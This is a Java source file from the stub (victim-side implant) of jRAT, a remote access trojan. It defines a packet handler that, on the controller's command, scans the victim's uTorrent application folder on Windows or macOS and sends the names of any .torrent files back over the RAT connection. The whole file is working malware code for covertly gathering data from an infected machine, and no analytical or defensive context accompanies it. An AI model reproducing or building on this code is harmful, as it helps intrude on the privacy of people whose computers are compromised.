package io.jrat.stub.packets.incoming;

import io.jrat.common.OperatingSystem;
import io.jrat.stub.Connection;
import io.jrat.stub.packets.outgoing.Packet40UTorrentDownload;

import java.io.File;


public class Packet57UTorrentDownloads extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		File dir = null;
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			dir = new File(System.getenv("APPDATA") + "\\uTorrent\\");
		} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
			dir = new File(System.getProperty("user.home") + "/Library/Application Support/uTorrent/");
		}

		if (dir != null && dir.exists()) {
			File[] files = dir.listFiles();
			for (File file : files) {
				if (file.getName().toLowerCase().endsWith(".torrent")) {
					Connection.addToSendQueue(new Packet40UTorrentDownload(file.getName()));
				}
			}
		}
	}

}
